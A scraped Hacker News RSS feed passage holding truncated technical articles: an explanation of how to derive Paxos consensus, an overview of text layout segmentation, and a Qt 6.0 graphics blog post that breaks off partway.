<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals. The strategy provides a unifying direction for brain and mental health research at the university.</span></span></span></em></span></span></p>



                                                                                                                                                                                                                                      

  
    

    
  <div data-history-node-id="23525" role="article" about="/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers" typeof="schema:Article">
    <div>
      <div>
                          <div>
            <div>
              <div>
                <div>
                                        <picture>
                <!--[if IE 9]><video style="display: none;"><![endif]-->
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8 1x" media="all and (min-width: 992px)" type="image/jpeg">
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_tablet/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=5tYigcJ8 1x" media="all and (min-width: 768px)" type="image/jpeg">
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_mobile/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=-CoV0v5E 1x" media="all and (max-width: 767px)" type="image/jpeg">
            <!--[if IE 9]></video><![endif]-->
            <img src="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8" alt="Dr. Wayne Chen, PhD" title="Dr. Wayne Chen, PhD" typeof="foaf:Image">

  </picture>

                                    </div>
                                  <p>Dr. Wayne Chen, PhD</p>
                                                  <p>Britton Ledingham for the Libin Cardiovascular Institute</p>
                              </div>
            </div>
          </div>
              </div>
          </div>
  </div>


                                                                                    </div>
                
                
              </div>
              
            </div>

          </div>
        </div></div>]]>
            </description>
            <link>https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906758</guid>
            <pubDate>Tue, 27 Oct 2020 12:32:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How you could have come up with Paxos yourself]]>
            </title>
            <description>
<![CDATA[
Score 211 | Comments 50 (<a href="https://news.ycombinator.com/item?id=24906225">thread link</a>) | @todsacerdoti
<br/>
October 27, 2020 | https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html | <a href="https://web.archive.org/web/*/https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In the field of computer science, the Paxos algorithm is notorious for how difficult it is to understand. I had to learn the Paxos algorithm in my distributed systems class. I even have "implemented" it by translating Leslie Lamport's TLA+ to Python. But I didn't understand it until much much later.</p>

<p>Now I have a better understanding of Paxos than I used to, I want to explain it to other people. Not because I'd like to help people, rather, I find that explaining things is a very good way to find blind spots in my own understanding.</p>

<p>So, where do we start? Personally, I dislike explanations that start with a step-by-step breakdown of the algorithm, followed by a proof of why those steps do what they claim to do. Instead, I much prefer to start with the problem the algorithm tries to solve, then iteratively come up with a solution together with the reader. So that's what I am going to do. And now you understand the title.</p>

<p><em>Small disclaimer:</em> The glossaries used in this article is different from what is commonly used for Paxos. I just picked the ones that made the most sense for my narrative.</p>

<h2 id="the-problem">The problem</h2>

<p>The distributed consensus problem is widely useful, so the reader probably doesn't need to be motivated. Here I will just simply state the problem.</p>

<p>There is a group of agents (let's call them $\sc{CLIENT}s$), who want to choose a number among their selections. Any number is fine, as long as everyone agrees on the same number.</p>

<p>Here, there are a few assumptions we will make to make this problem meaningful:</p>

<ul>
  <li>All the agents - including but not limited to the $\sc{CLIENT}s$, as we will add more types of agents later - are well-behaved. Meaning they all execute the prescribed algorithms faithfully, and don't maliciously try to trick other agents. (If you like jargons: Byzantine failures don't occur.)</li>
  <li>Agents can talk to each other by sending each other messages, but the messages they send to each other could take arbitrarily long before reaching their destination, and might get lost (but never altered).</li>
</ul>

<p>The agents could also "fail". However, failing is equivalent to all messages sent to/from that agent being lost forever. So whether we have this assumption or not won't change the algorithm we come up with.</p>

<p>Also, to not complicate things, we are only solving the "single-round" consensus problem in this article, meaning as the output of this algorithm, all of the $\sc{CLIENT}s$ will get a single number which they agree on.</p>

<h2 id="solution-searching-adventure">Solution searching adventure</h2>

<h3 id="iteration-0">Iteration 0</h3>

<p>When trying to solve a complex problem such as this one, it's usually a good idea to start by simplifying the problem.
As a start, let's just ignore the need to be reliable entirely.</p>

<p>If we throw reliability out the window, it should be easy to come up with a very simple solution: we add an agent (let's call it $\sc{COORDINATOR}$).
The $\sc{CLIENTS}$ send whatever number they pick to the $\sc{COORDINATOR}$ in a $\sc{PROPOSAL}(client_i, x)$ message, where $x$ is the number
proposed by the $i$-th $\sc{CLIENT}$. The $\sc{COORDINATOR}$ picks an arbitrary proposal (say, $x'$),
and informs the other $\sc{CLIENT}s$ about this decision.
Specifically, the $\sc{COORDINATOR}$ will just reply with a $\sc{CHOSEN}(x')$ message to all the $\sc{PROPOSAL}(\ldots)$ messages it has
received and will receive.</p>

<p>If we assume no messages ever get lost, it is quite easy to see that every $\sc{CLIENT}$ will get a number. And because only one number is ever chosen, they will all get the same number.</p>

<p>It is also easy to see why this solution is impractical: it has a single point of failure. Once the singular $\sc{COORDINATOR}$ fails, no further progress can be made.</p>

<h3 id="iteration-1">Iteration 1</h3>

<p>To improve this almost looks easy at first glance: just add more $\sc{COORDINATOR}s$!</p>

<p>Sure, more $\sc{COORDINATOR}s$ would remove the single point of failure. However, if there are more than one $\sc{COORDINATOR}s$, they might individually make different decisions, which results in the $\sc{CLIENT}s$ having disagreement.</p>

<p>What if we let the $\sc{COORDINATOR}s$ reach an agreement among themselves before responding? But wait, doesn't that sound familiar? Having a group of agents reaching an agreement, that's exactly what we added the $\sc{COORDINATOR}s$ to solve. We just made the problem cyclic.</p>

<p>Let's take a step back. Is there a way for the clients to reach an agreement without having the $\sc{COORDINATOR}s$ communicate with each other?</p>

<p>In other words, among the decisions of the $\sc{COORDINATOR}s$, is there an deterministic algorithm to pick out a specific one that is robust against message losses?</p>

<p>This might sound hard, but it's actually quite simple: pick the decision that is backed by more than half of the $\sc{COORDINATOR}s$.</p>

<p>There can't be two decisions both with more than half of the $\sc{COORDINATOR}s$ backing them; and if a decision doesn't have that many $\sc{COORDINATOR}s$ backing it, it won't appear to have more backing $\sc{COORDINATOR}s$ through message losses.</p>

<p>Since this approach resembles a majority vote, let's call $\sc{COORDINATOR}$ decisions $\sc{VOTE}(coord_i, x)$ from now on, where $x$ is the number picked by the $i$-th $\sc{COORDINATOR}$. Each $\sc{COORDINATOR}$ has a single vote, because each of them only makes a single decision.</p>

<p>Obviously, our solution cannot be infinitely reliable. If more than half of the $\sc{COORDINATOR}s$ went down, there will never be a majority reached. But this is already vastly better than our first solution, and the reliability scales with the number of $\sc{COORDINATOR}s$. So we will call it good enough.</p>

<p>Sadly, this solution doesn't actually work: there might not be a majority at all! For example, it's possible that three of the proposals each get a third of the votes. We would have a stalemate in that case.</p>

<h3 id="iteration-2">Iteration 2</h3>

<p>Again, a solution seems straightforward: just try again in case of a stalemate.</p>

<p>But then again, things aren't that simple.</p>

<p>First of all, the $\sc{COORDINATOR}s$ need to be made aware of a retry. Otherwise, because each $\sc{COORDINATOR}$ only has one vote, they won't be able to vote again even if the $\sc{CLIENT}s$ retry.</p>

<p>To do that, we attach an attempt id to all the messages sent. i.e. $\sc{PROPOSAL}(client_i, x)$ becomes $\sc{PROPOSAL}(\#attempt, client_i, x)$, and so forth. Each time a $\sc{CLIENT}$ retries, it bumps $\#attempt$ to the maximum $\#attempt$ it knows of plus 1. And the $\sc{COORDINATOR}s$ should only responds to messages with the most recent $\#attempt$.</p>

<p>Hopefully the intent of the $\#attempt$ number is clear. (<a href="https://github.com/yshui/explain-algorithms/issues/new">Let me know</a> if not.)</p>

<p>Are we good now? Unfortunately, no. Consider this scenario:</p>

<p>There were 2 clients. They proposed their numbers, the $\sc{COORDINATOR}$ voted on them and all agreed on a single number, $x_1$, all is good. But, all of the $\sc{VOTE}(\ldots)$ messages got lost on the way to $client_2$, while $client_1$ received all of the messages just fine. At this point, $client_1$ thought $x_1$ is the number, but $client_2$ went on to retry. The $\sc{COORDINATOR}s$ voted again, and got $x_2$. This time, all the messages sent to $client_1$ got lost.</p>

<p>And behold, we got the two clients to disagree.</p>

<p>There is an important insight to be had here. Whenever a $\sc{COORDINATOR}$, say $coord_i$, sends out a $\sc{VOTE}(\ldots, coord_i, x)$, there is a chance that some $\sc{CLIENT}$ would adopt $x$. If $coord_i$ ever sends out two votes with different $x$, there is a chance that some of the $\sc{CLIENT}s$ would disagree.</p>

<p>In other words, once a $\sc{COORDINATOR}$ has revealed its vote, it has to stick to it.</p>

<p>This seems to run contrary to our attempt: if the $\sc{COORDINATOR}s$ cannot change their votes, what's the point of retrying? A stalemate will be a stalemate forever.</p>

<p>Looks like we reached a dead end with this type of voting. It appears the problem stems from the fact that the $\sc{COORDINATOR}s$ have to commit to their votes.</p>

<p>So, what if we introduce a form of non-commitment voting?</p>

<h3 id="iteration-3">Iteration 3</h3>

<p>Let's explore this idea. Say, the $\sc{COORDINATOR}s$ could now send a $\sc{TENTATIVE}\sc{VOTE}(\#attempt, coord_i, x)$ message, to tentatively vote for $x$.</p>

<p>Obviously, the $\sc{CLIENT}s$ couldn't adopt $x$ right away. So what's this vote good for?</p>

<p>Ah, right, it could get us to a majority.</p>

<p>It is correct that tentative votes don't lead directly to an agreement among $\sc{CLIENT}s$, but it can show us when a majority has formed among the $\sc{COORDINATOR}s$.</p>

<p>Once a $\sc{CLIENT}$ sees a majority tentative vote, it can then message the $\sc{COORDINATOR}s$ to ask for an actual vote. (Let's call this message $\sc{PLEASE}\sc{VOTE}(\#attempt, client_i)$). Intuitively, the $\sc{COORDINATOR}s$ have to make the same vote in the actual vote as their tentative votes.</p>

<p>If all goes well, we would get a majority and an agreement. If there is no majority, the $\sc{COORDINATOR}s$ won't even start a vote, so they are free to change their mind. So the $\sc{CLIENT}s$ could start another attempt which might have a different outcome.</p>

<p>What if things don't go well? What if the $\sc{PLEASE}\sc{VOTE}$ messages weren't received by some of the $\sc{COORDINATOR}s$?
In that case, some of the $\sc{COORDINATOR}s$ would have voted, and their decisions cannot be changed. That is to say, in all subsequent attempts, these $\sc{COORDINATOR}s$ will always vote for what they have voted for, whether it's a tentative vote, or the actual vote. But that doesn't create a problem for us. There was a majority in the tentative votes, and now we solidified part of the tentative votes. There is at least one way we can still reach a majority in the next round: everyone votes the same as they did in this round. And we can prove this inductively for all future rounds.</p>

<p>From this, we can have a rough image of how the algorithm functions: as attempts are being made, more and more $\sc{COORDINATOR}s$ start to make up their mind which number they will commit to, while making sure a majority could still be reached. Eventually, …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html">https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html</a></em></p>]]>
            </description>
            <link>https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906225</guid>
            <pubDate>Tue, 27 Oct 2020 11:06:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text layout is a loose hierarchy of segmentation]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24906010">thread link</a>) | @adamnemecek
<br/>
October 27, 2020 | https://raphlinus.github.io/text/2020/10/26/text-layout.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/text/2020/10/26/text-layout.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/text/2020/10/26/text-layout.html">https://raphlinus.github.io/text/2020/10/26/text-layout.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/text/2020/10/26/text-layout.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906010</guid>
            <pubDate>Tue, 27 Oct 2020 10:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graphics in Qt 6.0: QRhi, Qt Quick, Qt Quick 3D]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24905634">thread link</a>) | @MikusR
<br/>
October 27, 2020 | https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            

                            <p>
                                Monday October 26, 2020 by <a href="https://www.qt.io/blog/author/laszlo-agocs">Laszlo Agocs</a> | <a href="#commento">Comments</a>
                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>
<!--more-->
<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png" alt="shaderconditioning" width="1280" srcset="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=640&amp;name=shaderconditioning.png 640w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png 1280w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1920&amp;name=shaderconditioning.png 1920w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=2560&amp;name=shaderconditioning.png 2560w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3200&amp;name=shaderconditioning.png 3200w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3840&amp;name=shaderconditioning.png 3840w" sizes="(max-width: 1280px) 100vw, 1280px"></p>
<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
